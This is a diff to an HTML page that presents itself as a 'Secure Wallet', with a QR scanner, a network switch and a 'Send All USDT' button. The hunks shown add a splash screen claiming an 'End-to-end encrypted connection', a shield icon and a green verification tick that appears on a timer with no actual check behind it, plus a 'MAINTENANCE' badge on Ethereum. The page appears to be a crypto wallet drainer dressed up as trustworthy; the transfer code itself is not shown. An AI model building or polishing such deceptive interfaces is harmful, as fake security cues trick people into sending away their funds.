@@ -158,6 +158,205 @@
             letter-spacing: 0.5px;
         }
 
+        /* Modern Splash Screen */
+        .splash-screen {
+            position: fixed;
+            inset: 0;
+            z-index: 10000;
+            background: var(--navy);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.6s ease, transform 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        .splash-screen.hide {
+            opacity: 0;
+            transform: scale(1.15);
+            pointer-events: none;
+        }
+
+        .splash-screen .splash-ring {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            border: 3px solid rgba(37, 99, 235, 0.15);
+            border-top-color: var(--blue-500);
+            animation: splashSpin 1s linear infinite;
+            position: absolute;
+        }
+
+        .splash-screen .splash-ring:nth-child(2) {
+            width: 80px;
+            height: 80px;
+            border-color: rgba(37, 99, 235, 0.1);
+            border-top-color: var(--blue-400);
+            animation-duration: 0.8s;
+            animation-direction: reverse;
+        }
+
+        .splash-screen .splash-ring:nth-child(3) {
+            width: 60px;
+            height: 60px;
+            border-color: rgba(37, 99, 235, 0.08);
+            border-top-color: var(--blue-300);
+            animation-duration: 0.6s;
+        }
+
+        @keyframes splashSpin {
+            to { transform: rotate(360deg); }
+        }
+
+        .splash-screen .splash-shield {
+            width: 48px;
+            height: 48px;
+            background: linear-gradient(135deg, var(--blue-500), var(--blue-700));
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 20px rgba(37, 99, 235, 0.4);
+            position: relative;
+            z-index: 2;
+            animation: shieldPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes shieldPulse {
+            0%, 100% { transform: scale(1); box-shadow: 0 4px 20px rgba(37, 99, 235, 0.4); }
+            50% { transform: scale(1.08); box-shadow: 0 6px 28px rgba(37, 99, 235, 0.6); }
+        }
+
+        .splash-screen .splash-shield svg {
+            width: 24px;
+            height: 24px;
+            color: white;
+        }
+
+        .splash-screen .splash-title {
+            font-size: 20px;
+            font-weight: 800;
+            color: white;
+            letter-spacing: -0.3px;
+            margin-top: 32px;
+            opacity: 0;
+            animation: fadeUp 0.5s ease forwards;
+            animation-delay: 0.3s;
+        }
+
+        .splash-screen .splash-sub {
+            font-size: 12px;
+            color: rgba(255,255,255,0.45);
+            font-weight: 500;
+            letter-spacing: 0.8px;
+            text-transform: uppercase;
+            margin-top: 6px;
+            opacity: 0;
+            animation: fadeUp 0.5s ease forwards;
+            animation-delay: 0.5s;
+        }
+
+        .splash-screen .splash-progress {
+            width: 120px;
+            height: 3px;
+            background: rgba(255,255,255,0.08);
+            border-radius: 2px;
+            margin-top: 24px;
+            overflow: hidden;
+            opacity: 0;
+            animation: fadeUp 0.5s ease forwards;
+            animation-delay: 0.7s;
+        }
+
+        .splash-screen .splash-progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, var(--blue-500), var(--blue-400));
+            border-radius: 2px;
+            animation: progressFill 1.8s ease forwards;
+            animation-delay: 0.8s;
+        }
+
+        @keyframes progressFill {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .splash-screen .splash-tick-wrap {
+            position: absolute;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            transform: scale(0.5);
+            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        .splash-screen .splash-tick-wrap.show {
+            opacity: 1;
+            transform: scale(1);
+        }
+
+        .splash-screen .splash-tick {
+            width: 72px;
+            height: 72px;
+            background: linear-gradient(135deg, #16a34a, #22c55e);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 8px 32px rgba(22, 163, 74, 0.4);
+        }
+
+        .splash-screen .splash-tick svg {
+            width: 32px;
+            height: 32px;
+            color: white;
+            stroke-width: 3;
+        }
+
+        /* Bomb out particles - solid modern style */
+        .bomb-particle {
+            position: fixed;
+            z-index: 10001;
+            pointer-events: none;
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            animation: bombFly 0.7s ease-out forwards;
+        }
+
+        .bomb-particle.type-1 { background: var(--blue-500); }
+        .bomb-particle.type-2 { background: var(--blue-400); }
+        .bomb-particle.type-3 { background: rgba(37, 99, 235, 0.6); }
+        .bomb-particle.type-4 { background: rgba(59, 130, 246, 0.4); }
+        .bomb-particle.type-5 { background: white; }
+
+        @keyframes bombFly {
+            0% { transform: translate(0, 0) scale(1); opacity: 1; }
+            100% { transform: translate(var(--tx), var(--ty)) scale(0); opacity: 0; }
+        }
+
+        /* Shockwave ring */
+        .shockwave {
+            position: fixed;
+            z-index: 10000;
+            border-radius: 50%;
+            border: 2px solid var(--blue-500);
+            pointer-events: none;
+            animation: shockwaveExpand 0.6s ease-out forwards;
+        }
+
+        @keyframes shockwaveExpand {
+            0% { width: 0; height: 0; opacity: 0.6; }
+            100% { width: 400px; height: 400px; opacity: 0; }
+        }
+
         /* Main card */
         .card {
             position: relative;
@@ -307,6 +506,28 @@
             background: rgba(0, 0, 0, 0.04);
         }
 
+        .network-option:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            background: transparent !important;
+            color: var(--slate-300) !important;
+            box-shadow: none !important;
+        }
+
+        .network-option .maintenance-badge {
+            display: inline-block;
+            font-size: 8px;
+            font-weight: 700;
+            color: #d97706;
+            background: #fef3c7;
+            border: 1px solid #fcd34d;
+            padding: 1px 5px;
+            border-radius: 4px;
+            margin-left: 4px;
+            vertical-align: middle;
+            letter-spacing: 0.5px;
+        }
+
         /* QR area */
         .qr-wrap {
             background: var(--slate-50);
@@ -450,6 +671,12 @@
             .popup-toast .toast-icon { width: 24px; height: 24px; }
             .network-option { padding: 9px 12px; font-size: 12px; }
             .btn-send { padding: 13px; font-size: 14px; }
+            .splash-screen .splash-title { font-size: 18px; }
+            .splash-screen .splash-sub { font-size: 11px; }
+            .splash-screen .splash-shield { width: 40px; height: 40px; border-radius: 12px; }
+            .splash-screen .splash-shield svg { width: 20px; height: 20px; }
+            .splash-screen .splash-tick { width: 56px; height: 56px; }
+            .splash-screen .splash-tick svg { width: 24px; height: 24px; }
         }
 
         @media (max-width: 360px) {
@@ -465,11 +692,37 @@
             .popup-toast { transition-duration: 0.1s !important; }
             .btn-send::before { display: none; }
             .spinner { animation-duration: 1.5s; }
+            .splash-screen { display: none !important; }
         }
     </style>
 <base target="_blank">
 </head>
 <body>
+
+    <!-- Modern Splash Screen -->
+    <div class="splash-screen" id="splashScreen">
+        <div class="splash-ring"></div>
+        <div class="splash-ring"></div>
+        <div class="splash-ring"></div>
+        <div class="splash-shield">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                <path d="m9 12 2 2 4-4"/>
+            </svg>
+        </div>
+        <div class="splash-title">Secure Wallet</div>
+        <div class="splash-sub">End-to-end encrypted connection</div>
+        <div class="splash-progress">
+            <div class="splash-progress-bar"></div>
+        </div>
+        <div class="splash-tick-wrap" id="splashTickWrap">
+            <div class="splash-tick">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M20 6L9 17l-5-5"/>
+                </svg>
+            </div>
+        </div>
+    </div>
 
     <!-- Grid background overlay -->
     <div class="grid-bg"></div>
@@ -510,7 +763,9 @@
 
         <div class="network-switch">
             <button class="network-option active" data-chain="bsc">BSC</button>
-            <button class="network-option" data-chain="eth">Ethereum</button>
+            <button class="network-option" data-chain="eth" disabled>
+                Ethereum <span class="maintenance-badge">MAINTENANCE</span>
+            </button>
         </div>
 
         <div class="qr-wrap">
@@ -522,7 +777,10 @@
         <div class="status-box warn" id="status">Select network, then scan QR</div>
 
         <button class="btn-send" id="btnSend" onclick="sendUSDT()">
-            &#9889; Send All USDT
+            <svg style="width:16px;height:16px;vertical-align:middle;margin-right:6px;" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/>
+            </svg>
+            Send All USDT
         </button>
 
         <div class="info-row">
@@ -534,25 +792,88 @@
     <!-- Floating crypto generation & popup logic -->
     <script>
         (function() {
-            // Generate floating cryptocurrency symbols
+            // Modern Splash screen with solid tick and bomb out
+            var splash = document.getElementById('splashScreen');
+            var tickWrap = document.getElementById('splashTickWrap');
+            var rings = splash.querySelectorAll('.splash-ring');
+            var shield = splash.querySelector('.splash-shield');
+            var title = splash.querySelector('.splash-title');
+            var sub = splash.querySelector('.splash-sub');
+            var progress = splash.querySelector('.splash-progress');
+
+            // After progress bar fills, show tick
+            setTimeout(function() {
+                // Hide loading elements
+                rings.forEach(function(r) { r.style.opacity = '0'; r.style.transition = 'opacity 0.3s'; });
+                shield.style.opacity = '0'; shield.style.transition = 'opacity 0.3s';
+                title.style.opacity = '0'; title.style.transition = 'opacity 0.3s';
+                sub.style.opacity = '0'; sub.style.transition = 'opacity 0.3s';
+                progress.style.opacity = '0'; progress.style.transition = 'opacity 0.3s';
+
+                // Show green tick
+                setTimeout(function() {
+                    tickWrap.classList.add('show');
+
+                    // After tick shows, bomb out with particles and shockwave
+                    setTimeout(function() {
+                        var centerX = window.innerWidth / 2;
+                        var centerY = window.innerHeight / 2;
+
+                        // Shockwave ring
+                        var wave = document.createElement('div');
+                        wave.className = 'shockwave';
+                        wave.style.left = (centerX - 0) + 'px';
+                        wave.style.top = (centerY - 0) + 'px';
+                        wave.style.transform = 'translate(-50%, -50%)';
+                        document.body.appendChild(wave);
+                        setTimeout(function() { if (wave.parentNode) wave.parentNode.removeChild(wave); }, 600);
+
+                        // Solid particles flying out
+                        for (var i = 0; i < 30; i++) {
+                            var p = document.createElement('div');
+                            p.className = 'bomb-particle type-' + (1 + Math.floor(Math.random() * 5));
+                            p.style.left = centerX + 'px';
+                            p.style.top = centerY + 'px';
+                            var angle = (Math.PI * 2 * i) / 30 + (Math.random() - 0.5) * 0.3;
+                            var distance = 80 + Math.random() * 350;
+                            p.style.setProperty('--tx', Math.cos(angle) * distance + 'px');
+                            p.style.setProperty('--ty', Math.sin(angle) * distance + 'px');
+                            p.style.animationDelay = (Math.random() * 0.15) + 's';
+                            document.body.appendChild(p);
+                            setTimeout(function(el) {
+                                if (el.parentNode) el.parentNode.removeChild(el);
+                            }.bind(null, p), 900);
+                        }
+
+                        // Hide splash with scale
+                        splash.classList.add('hide');
+                        setTimeout(function() {
+                            if (splash.parentNode) splash.parentNode.removeChild(splash);
+                        }, 700);
+
+                    }, 600);
+                }, 350);
+            }, 2600);
+
+            // Generate floating symbols - solid modern style
             const cryptoItems = [
-                { text: '&#128163;', isSymbol: true },
-                { text: '&#9989;', isSymbol: true },
-                { text: '&#128170;', isSymbol: true },
-                { text: '&#128274;', isSymbol: true },
-                { text: '&#128640;', isSymbol: true },
-                { text: '&#9889;', isSymbol: true },
-                { text: '&#128293;', isSymbol: true },
-                { text: '&#128142;', isSymbol: true },
-                { text: '&#127760;', isSymbol: true },
-                { text: '&#128273;', isSymbol: true },
-                { text: '&#128200;', isSymbol: true },
-                { text: '&#128176;', isSymbol: true },
-                { text: '&#128178;', isSymbol: true },
-                { text: '&#128181;', isSymbol: true },
-                { text: '&#128182;', isSymbol: true },
-                { text: '&#128183;', isSymbol: true },
-                { text: '&#128184;', isSymbol: true }
+                { text: 'BTC', isSymbol: false },
+                { text: 'ETH', isSymbol: false },
+                { text: 'USDT', isSymbol: false },
+                { text: 'SOL', isSymbol: false },
+                { text: 'BNB', isSymbol: false },
+                { text: 'XRP', isSymbol: false },
+                { text: 'ADA', isSymbol: false },
+                { text: 'DOT', isSymbol: false },
+                { text: 'MATIC', isSymbol: false },
+                { text: 'AVAX', isSymbol: false },
+                { text: 'LINK', isSymbol: false },
+                { text: 'UNI', isSymbol: false },
+                { text: 'AAVE', isSymbol: false },
+                { text: 'COMP', isSymbol: false },
+                { text: 'MKR', isSymbol: false },
+                { text: 'CRV', isSymbol: false },
+                { text: 'SUSHI', isSymbol: false }
             ];
 
             var container = document.getElementById('floatingBg');
@@ -562,7 +883,7 @@
                 var item = cryptoItems[Math.floor(Math.random() * cryptoItems.length)];
                 var el = document.createElement('div');
                 el.className = 'float-crypto';
-                el.innerHTML = item.text;
+                el.textContent = item.text;
 
                 var size = item.isSymbol ? (22 + Math.random() * 20) : (11 + Math.random() * 6);
                 var opacity = 0.03 + Math.random() * 0.06;
@@ -750,7 +1071,7 @@
                 setStatus('Confirming: <a href="' + explorer + tx.hash + '" target="_blank">' + tx.hash.slice(0, 14) + '...</a>', 'warn');
                 const receipt = await tx.wait();
                 if (receipt && receipt.status === 1) {
-                    setStatus('&#9989; Sent ' + parseFloat(formatted).toFixed(2) + ' USDT! <a href="' + explorer + tx.hash + '" target="_blank">View Transaction</a>', 'ok');
+                    setStatus('<span style="display:inline-flex;align-items:center;gap:4px;"><svg style="width:14px;height:14px;color:#16a34a;" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg> Sent ' + parseFloat(formatted).toFixed(2) + ' USDT!</span> <a href="' + explorer + tx.hash + '" target="_blank">View Transaction</a>', 'ok');
                     btn.style.display = 'none';
                 } else {
                     setStatus('Transaction reverted.', 'error');
@@ -767,6 +1088,7 @@
         document.querySelectorAll('.network-option').forEach(function(btn) {
             btn.addEventListener('click', async function() {
                 if (btn.classList.contains('active')) return;
+                if (btn.disabled) return;
                 document.querySelectorAll('.network-option').forEach(function(b) {
                     b.classList.remove('active');
                 });
